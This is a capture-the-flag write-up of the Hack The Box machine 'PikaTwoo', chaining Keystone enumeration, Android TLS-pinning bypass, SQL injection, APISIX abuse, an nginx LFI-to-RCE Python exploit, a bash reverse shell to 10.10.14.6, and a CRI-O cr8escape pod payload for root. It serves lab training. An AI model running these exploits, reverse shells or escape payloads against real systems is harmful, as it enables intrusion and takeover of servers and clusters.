

![1](</Writeups/Machines/PikaTwoo/img/logo.png>)
By Rug4lo

## Reconnaissance

First of all we are going to start with the basic nmap scan 
```bash
 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oN allPorts2 10.10.11.199
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-12 19:39 CEST
Initiating SYN Stealth Scan at 19:39
Scanning 10.10.11.199 [65535 ports]
Discovered open port 443/tcp on 10.10.11.199
Discovered open port 22/tcp on 10.10.11.199
Discovered open port 80/tcp on 10.10.11.199
Discovered open port 8080/tcp on 10.10.11.199
Discovered open port 35357/tcp on 10.10.11.199
Discovered open port 5672/tcp on 10.10.11.199
Discovered open port 4369/tcp on 10.10.11.199
Discovered open port 5000/tcp on 10.10.11.199
Discovered open port 25672/tcp on 10.10.11.199
Completed SYN Stealth Scan at 19:39, 16.56s elapsed (65535 total ports)
Nmap scan report for 10.10.11.199
Host is up, received user-set (0.36s latency).
Scanned at 2023-10-12 19:39:12 CEST for 17s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
443/tcp   open  https        syn-ack ttl 63
4369/tcp  open  epmd         syn-ack ttl 63
5000/tcp  open  upnp         syn-ack ttl 63
5672/tcp  open  amqp         syn-ack ttl 63
8080/tcp  open  http-proxy   syn-ack ttl 63
25672/tcp open  unknown      syn-ack ttl 63
35357/tcp open  openstack-id syn-ack ttl 63
```
Now we are going to use the default reconnaissance scripts to get more information about these ports
```bash
nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 10.10.11.199 -oN Targeted
```
```bash
# Nmap 7.93 scan initiated Thu Oct 12 19:02:07 2023 as: nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 -oN Targeted 10.10.11.199
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.11.199
Host is up (0.24s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 f3922dfd8422d78df6b09e788eb93be7 (RSA)
|   256 01e43ec06643df25af8a71b83906df9f (ECDSA)
|_  256 4fec39764e719471befa7ffaa6a81674 (ED25519)
80/tcp    open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Pikaboo
|_http-cors: HEAD GET POST PUT DELETE PATCH
443/tcp   open  ssl/http nginx 1.18.0
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK
| Not valid before: 2021-12-29T20:33:08
|_Not valid after:  3021-05-01T20:33:08
| tls-alpn: 
|_  http/1.1
|_http-server-header: APISIX/2.10.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-nextprotoneg: 
|_  http/1.1
4369/tcp  open  epmd     Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
5000/tcp  open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-195255c3-658b-44fc-ae95-c602a1893b72
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 300 MULTIPLE CHOICES
|     Content-Type: application/json
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-10e3a45c-8a1f-46cc-82dc-94332d78de7d
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "http://pikatwoo.pokatmon.htb:5000/v3/"
}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]}}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-d0366dc1-c99b-4be6-b65e-a258c99ac306
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-55813e0c-ce41-4c9f-85df-6fd8e088f192
|   SIPOptions: 
|_    SIP/2.0 200 OK
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@pikatwoo.pokatmon.htb
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
|   platform: Erlang/OTP 23.2.6
|   product: RabbitMQ
|   version: 3.8.9
|   mechanisms: AMQPLAIN PLAIN
|_  locales: en_US
8080/tcp  open  http     nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
25672/tcp open  unknown
35357/tcp open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-title: Site doesn't have a title (application/json).
|_Requested resource was http://10.10.11.199:35357/v3/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=10/12%Time=65282698%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:
SF:\x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:500
SF:0/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-10e3a4
SF:5c-8a1f-46cc-82dc-94332d78de7d\r\n\r\n{\"versions\":\x20{\"values\":\x2
SF:0\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\"
SF::\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\"
SF:,\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"
SF:media-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x2
SF:0\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPRequ
SF:est,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20X-Auth-Token\
SF:r\nx-openstack-request-id:\x20req-55813e0c-ce41-4c9f-85df-6fd8e088f192\
SF:r\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVa
SF:ry:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-d0366dc1-c99b-4be
SF:6-b65e-a258c99ac306\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVar
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-195255c3-658b-44fc
SF:-ae95-c602a1893b72\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\
SF:x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h
SF:1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>
SF:\n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 12 19:04:48 2023 -- 1 IP address (1 host up) scanned in 160.88 seconds
```
We can see that it has a couple of subdomains, which I am going to add to /etc/hots

![1](</Writeups/Machines/PikaTwoo/img/1.png>)

If we do some directory enumeration we will be able to see something interesting.

![1](</Writeups/Machines/PikaTwoo/img/2.png>)

We can also enumerate port 8080, where we will find an /info that holds this information

![1](</Writeups/Machines/PikaTwoo/img/3.png>)

If we go to the main page, we can click on one of the monsters

![1](</Writeups/Machines/PikaTwoo/img/4.png>)

But when we go in we run into this error:

![1](</Writeups/Machines/PikaTwoo/img/5.png>)

If we use Dustbuster to list the directories of the main page, we will find a CANGELOG there that, if we download it, shows us this:

![1](</Writeups/Machines/PikaTwoo/img/6.png>)

With this we can see that it has an android application in beta

## Keystone exploitation

Alright, once we have gathered this information we can go and check what port 5000 is for, which is normally used by the Keystone service

Source --> https://docs.openstack.org/install-guide/firewalls-default-ports.html

If we dig into this service we will see that it has a vulnerability that can be useful to us

CVE --> https://bugs.launchpad.net/keystone/+bug/1688137

This tells us that if we send POST requests to /v3/auth/tokens with that data we can obtain the user's token; for this we need to send several requests, so we are going to write a bash script to automate the process:

![1](</Writeups/Machines/PikaTwoo/img/7.png>)

When we run it we will see that one of the errors contains the admin user's token (remembering that in the script we set the user to admin)

![1](</Writeups/Machines/PikaTwoo/img/8.png>)

Now that we have the admin user's id we can use ffuf to check whether there are more users; for this we will use a sequence from 1 to 10 that we will define in **F1**, and as **F2** we will set the list of names to try, in my case I will use a SecLists wordlist
```bash
./ffuf -u http://10.10.11.199:5000/v3/auth/tokens -H "Content-type: application/json" -w <(seq 0 10):F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d '{ "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }' -ac
```
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.199:5000/v3/auth/tokens
 :: Wordlist         : F1: /proc/self/fd/12
 :: Wordlist         : F2: /opt/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : { "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5623ms]
    * F1: 7
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5662ms]
    * F1: 8
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5725ms]
    * F1: 9
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 6345ms]
    * F1: 10
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 9
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 8
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4709ms]
    * F1: 5
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5355ms]
    * F1: 10
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5416ms]
    * F1: 7
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5471ms]
    * F1: 6
    * F2: andrew
```
We find that there is a user called Andrew as well.

If we look into the official page we will see that this service usually uses a proxy called swift, where we can use the user we obtained

![1](</Writeups/Machines/PikaTwoo/img/9.png>)

We try a curl against this address and we will see that it exists but that we cannot access it; this tells us that the directory exists

![1](</Writeups/Machines/PikaTwoo/img/10.png>)

Since that directory exists, we can try to enumerate the directories under this new path to see whether there is anything interesting, so I am going to use the Feroxbuster tool 

![1](</Writeups/Machines/PikaTwoo/img/11.png>)

## Downloading the app

Perfect, we have an /android which, together with the CHANGELOG information we saw earlier, gives us the idea that the exploitation may go that way; if we browse to this page we will see this:

![1](</Writeups/Machines/PikaTwoo/img/12.png>)

We can download the apk with a wget 

![1](</Writeups/Machines/PikaTwoo/img/13.png>)

Now that we have the apk on our machine

we can decode it with this command, to look at the internal files
```bash
apktool d pokatmon-app.apk
```
With this we will get a folder with the app's internal files; now we can virtualize the android in order to test the apk

For this we will use Genymotion

![1](</Writeups/Machines/PikaTwoo/img/14.png>)

In my case I already have the phone to virtualize created, but to create it you just click the + and leave everything at its defaults; once we have the Android running we can simply drag the apk onto the android to push it to the device

![1](</Writeups/Machines/PikaTwoo/img/15.png>)

Now if we run the app we will see something interesting: it asks us for an email and a code, which we do not have

![1](</Writeups/Machines/PikaTwoo/img/16.png>)

## App reconnaissance

Since all of this is running locally we can try intercepting the request with Wireshark; we will see where it is trying to send the request (api.pokatmon-app.htb)

![1](</Writeups/Machines/PikaTwoo/img/17.png>)

That being the case, we can try to make it send the request to us by modifying the android's /etc/hosts; for that we first connect with abd to get a shell on the phone
```bash
adb shell
```
Now we use this command
```bash
mount -o remount,rw /
```
And we modify /etc/hosts with our ip

![1](</Writeups/Machines/PikaTwoo/img/18.png>)

since the request will now be sent to us, we can intercept it with burpsuite: we create a proxy listening on port 8443 (it would not let me use 443) whose destination points to port 443 of the htb machine

![1](</Writeups/Machines/PikaTwoo/img/19.png>)

And now we redirect every request that reaches us on port 443 to 8443 so that it goes through burpsuite; we do it with this command
```bash
socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:8443
```
Once we have all of this, we can see that if we send the request from the android it never reaches burpsuite; this is because the request uses an ssl certificate that we do not have, but since this application is running locally it is using ssl certificates stored inside the app, so we can use frida to look for them

## SSL certificate bypass with Frida

For this we download the frida release --> https://github.com/frida/frida/releases (you have to download frida-server-16.1.4-android-x86_64)

We extract it
```bash
7z X frida-server-16.1.4-android-x86_64.xz
```
And we rename it 
```bash
mv frida-server-16.1.4-android-x86_64 frida-server
```
Now we push it onto the phone
```bash
adb push frida-server /data/local/tmp/
```
We are going to make it executable
```bash
adb shell "chmod 755 /data/local/tmp/frida-server"
```
And finally we run it 
```bash
adb shell "/data/local/tmp/frida-server &"
```
If all of this is done correctly, we will be able to run this command (leaving the previous command running in the background)
```bash
frida-ps -U
```
Now we can see every process the phone is running; with that done we can start bypassing ssl, and for this we will use this frida script

Script GitHub --> https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js

We create a .js file on our machine with the contents of the script
```bash
nvim flutter-disable-tls.js
```
Now we run this script after closing the Pokatmon application, so that it reopens it but without caring about the ssl certificate
```bash
frida -U -l flutter-disable-tls.js -f htb.pokatmon.pokatmon_app
```
Now if we enter any email and code, we will be able to see the request in burpsuite 

![1](</Writeups/Machines/PikaTwoo/img/20.png>)

## Certificate signature bypass

This is the request in burpsuite 

![1](</Writeups/Machines/PikaTwoo/img/21.png>)

If we decrypt the signature, we will see that there is nothing special about it, it is a basic one, but when we were looking at the apk files we saw a public key and a private key

![1](</Writeups/Machines/PikaTwoo/img/22.png>)

To sign a certificate with these keys we can do it like this, straight into base64 (the at sign has to be left url unencoded):
```bash
openssl dgst -sha256 -sign private.pem <(echo -n "app_beta_mailaddr=hey@gmail.com'&app_beta_code=1234") | base64 -w 0 ; echo
```
It is finally giving us a different kind of response 

![1](</Writeups/Machines/PikaTwoo/img/23.png>)

## SQLi on the app login

Now we can try an SQL injection (anything you change in the message has to be signed again)

![1](</Writeups/Machines/PikaTwoo/img/24.png>)

And it gives us an email and a code! If we enter them it will throw an error

![1](</Writeups/Machines/PikaTwoo/img/25.png>)

To fix this we have to modify the android's /etc/hosts

![1](</Writeups/Machines/PikaTwoo/img/26.png>)

Now if we enter the credentials, it will let us into the app

![1](</Writeups/Machines/PikaTwoo/img/27.png>)

## APISIX exploitation to get the password 

There is nothing here, but we do have an email; on the main page there was a section to recover the password through email, and if we enter the email and intercept the request with burpsuite, we will see that it sends us to a forbidden

![1](</Writeups/Machines/PikaTwoo/img/28.png>)

If we modify the request a little, we will see that it gives us a token

![1](</Writeups/Machines/PikaTwoo/img/29.png>)

Even though we cannot do anything here, we have to remember that there is port 443 which we cannot access, and if we look at the nmap scans we will see that it runs APISIX/2.10.1

![1](</Writeups/Machines/PikaTwoo/img/30.png>)

This version has several vulnerabilities, one of which lets us bypass the API authentication

CVE --> https://nvd.nist.gov/vuln/detail/CVE-2021-45232

Trying other things we see that if we run a freoxbuster against the https of the main page, it returns several 403 status codes for everything containing private 

![1](</Writeups/Machines/PikaTwoo/img/31.png>)

We can try a curl, but we will see that we do not have access

![1](</Writeups/Machines/PikaTwoo/img/32.png>)

if we run another feroxbuster inside the /private directory we will find something quite interesting (url encoding the last character so that it does not get blocked)

![1](</Writeups/Machines/PikaTwoo/img/33.png>)

## Abusing the Password Reset section

We can reach /password-reset; from burpsuite we access this directory, but we will see the following message

![1](</Writeups/Machines/PikaTwoo/img/34.png>)

If we modify the request by adding the email, it will give us a token, very similar to the one we got when trying to recover the password.

![1](</Writeups/Machines/PikaTwoo/img/35.png>)

If we put that token into the previous request turned into a POST and we supply the token and the new password, we will finally manage to change it

![1](</Writeups/Machines/PikaTwoo/img/36.png>)

Now if we log in with the new password we will have access to this panel 

![1](</Writeups/Machines/PikaTwoo/img/37.png>)

If we intercept the first request we will see this:

![1](</Writeups/Machines/PikaTwoo/img/38.png>)

If we add debug it will give us a different kind of error

![1](</Writeups/Machines/PikaTwoo/img/39.png>)

## LFI exploitation

According to this post, an LFI is possible

CVE --> https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/

The request would be the following:

![1](</Writeups/Machines/PikaTwoo/img/40.png>)

## From LFI to RCE using nginx

If we search the internet we will see that there is a way to turn the LFI into an RCE through nginx

Post --> https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/

If we use this script, we will be able to execute commands

```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a'

# # find nginx worker processes 
# r  = requests.get(URL, params={
#     'file': '/proc/cpuinfo'
# })
# cpus = r.text.count('processor')
cpus = 2

# r  = requests.get(URL, params={
#     'file': '/proc/sys/kernel/pid_max'
# })
# pid_max = int(r.text)
# print(f'[*] cpus: {cpus}; pid_max: {pid_max}')
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESSa": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='0xdf0xdf\n<?php system("id"); /*' + 16*1024*'A') ## Ejecucion del comando

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESSa": "a"})
            if r.text and "0xdf0xdf" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

By modifying the command to execute we will be able to curl our own machine, and the rest is easy: we create a file containing a reverse shell back to our box

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

We use the script to make a request to our http server and download this file into the /tmp directory

```bash
curl 10.10.14.6:8080/shell -o /tmp/shell
```

Then we run the script once more, but with the command to execute the shell (and we start a listener on port 4444)

```bash
bash /tmp/shell
```

With this we will have access as the www user

![1](</Writeups/Machines/PikaTwoo/img/41.png>)

From the user's name we can tell that we are inside a container (it does not look like docker because there is no docker folder in the root), and if we cat this little file, we will see that we are on VMware

![1](</Writeups/Machines/PikaTwoo/img/42.png>)

If we go into /sun/secrets we will see that it holds a kubernetes.io, so this machine is running kubernetes

![1](</Writeups/Machines/PikaTwoo/img/43.png>)

We also find a token 

![1](</Writeups/Machines/PikaTwoo/img/44.png>)

## Kubernetes and APISIX exploitation to escape the container

Researching kubernetes I came across this post, which tells us how to bypass the kubernetes API authentication

POST --> https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/

So I am going to run these commands:
```bash
APISERVER=https://kubernetes.default.svc
```
```bash
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```
```bash
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
```
```bash
TOKEN=$(cat ${SERVICEACCOUNT}/token)
```
```bash
CACERT=${SERVICEACCOUNT}/ca.crt
```
Now we can curl the api with the token we have
```bash
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api ; echo
```
```bash
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.49.2:8443"
    }
  ]
}
```
We can also list the site's secrets
```bash
 curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/$NAMESPACE/secrets
```
This will give us two keys
```bash
"APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
"APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="
```
Thanks to all of this, and to this APISIX vulnerability, we will be able to execute commands

CVE --> https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/

We transfer chisel to the victim machine and run this command on our machine (the step we are about to do is so we can see the request in burpsuite, you can skip it if you do it with curl only)
```bash
./chisel server --reverse --port 8081
```
now we check that port 9080 is the apisix-admin one
```bash
curl apisix-admin:9080 -v
```
```bash
*   Trying 10.98.202.103:9080...
* Connected to apisix-admin (10.98.202.103) port 9080 (#0)
> GET / HTTP/1.1
> Host: apisix-admin:9080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Fri, 13 Oct 2023 23:27:37 GMT
< Content-Type: text/plain; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Server: APISIX/2.10.1
< 
{"error_msg":"404 Route Not Found"}
* Connection #0 to host apisix-admin left intact
```
seeing that it is port 9080, we run this command on the victim machine
```bash
./chisel client 10.10.14.7:8081 R:9080:apisix-admin:9080
```
Now we have port forwarding set up from that port to our machine, so if we curl this port we will get a response
```bash
curl localhost:9080
```
```bash
{"error_msg":"404 Route Not Found"}
```
All of this is so we can use burpsuite and make it easier to send the request for the RCE; now from burpsuite we are going to send a request based on this page 

Page --> https://apisix.apache.org/docs/apisix/plugins/batch-requests/

We are going to use this to create a file containing a reverse shell so we can connect back from the main machine; the request would be this:

![1](</Writeups/Machines/PikaTwoo/img/45.png>)

Now we curl this new page we created and start a listener, to check whether it sends us a request

![1](</Writeups/Machines/PikaTwoo/img/46.png>)

And we receive the request, perfect; now we can start building the request for the reverse shell, and for this we will use a filter command, which will let us run lua code and then tell it to execute in a shell

![1](</Writeups/Machines/PikaTwoo/img/47.png>)

Once it is created we start a listener and curl this new page

![1](</Writeups/Machines/PikaTwoo/img/48.png>)

Now inside, if we start looking for credentials we will see a config.yaml, which contains Andrew's ssh credentials
```bash
cat /usr/local/apisix/conf/config.yaml
```

![1](</Writeups/Machines/PikaTwoo/img/49.png>)

Now we can connect over ssh with these credentials and get the user.txt

![1](</Writeups/Machines/PikaTwoo/img/50.png>)

## Privilege escalation

Now the privilege escalation begins; we can see that in /home there is another user called Jennifer and in her home directory there is a template.yaml file
```bash
cat template.yaml 
```
```bash
apiVersion: v1
kind: Pod
metadata:
  name: template-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    imagePullPolicy: Never
```
Inside that same folder there is also a .kube (which tells us that it is using Kubernetes) and inside it a config
```bash
 cat config
```
```bash
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /home/jennifer/.minikube/ca.crt
    extensions:
    - extension:
        last-update: Fri, 18 Mar 2022 10:23:04 GMT
        provider: minikube.sigs.k8s.io
        version: v1.25.2
      name: cluster_info
    server: https://192.168.49.2:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    user: jennifer
  name: jennifer-context
current-context: jennifer-context
kind: Config
preferences: {}
users:
- name: jennifer
  user:
    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key
```
We can list the "namespaces" from this config
```bash
kubectl --kubeconfig /home/jennifer/.kube/config get namespaces
```
```bash
NAME              STATUS   AGE
applications      Active   575d
default           Active   575d
development       Active   337d
kube-node-lease   Active   575d
kube-public       Active   575d
kube-system       Active   575d
```
Since we have the config and the template.yaml we can try to create a "pod" using the namespaces we listed earlier (in my case it worked with development)
```bash
kubectl --kubeconfig /home/jennifer/.kube/config create -f template.yaml -n development
```
```bash
pod/template-pod created
```
We can try to list the "pods" in development, but it will not let us
```bash
kubectl --kubeconfig /home/jennifer/.kube/config get pods -n development
```
If we grep for crio we can see the Kubernetes version
```bash
grep -R crio
```
```bash
APIServerPort:8443 KubernetesVersion:v1.23.3
```
This version has a fairly recent vulnerability 

CVE --> https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/

Basically what this tells us is that every Kubernetes process uses the same kernel, so we can take advantage of that to inject commands; first we are going to move to /dev/shm (because /tmp gets wiped every so often), and we are going to create two files.

One called shell.sh which will hold the command we want to run as root
```bash
#!/bin/bash

chmod +s /bin/bash
```
And now we will create the malicious .yaml, which will execute the script for us
```bash
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/dev/shm/shell.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```
Now we create the "pod" with this .yaml
```bash
kubectl --kubeconfig /home/jennifer/.kube/config create -f malicius.yaml -n development
```
If we list the kernel processes we will see our command waiting to be executed
```bash
cat /proc/sys/kernel/core_pattern 
```
```bash
|/dev/shm/shell.sh #'
```
And we remove the limit 
```bash
ulimit -c unlimited
```
Now that everything is ready, we run it like this: we create a background process
```bash
tail -f /dev/null &
```
Finally we kill this new process like this 
```bash
kill -SIGSEGV 1086444
```
And we will have bash with SUID

![1](</Writeups/Machines/PikaTwoo/img/51.png>)

Now we go to /root and read the root.txt ; )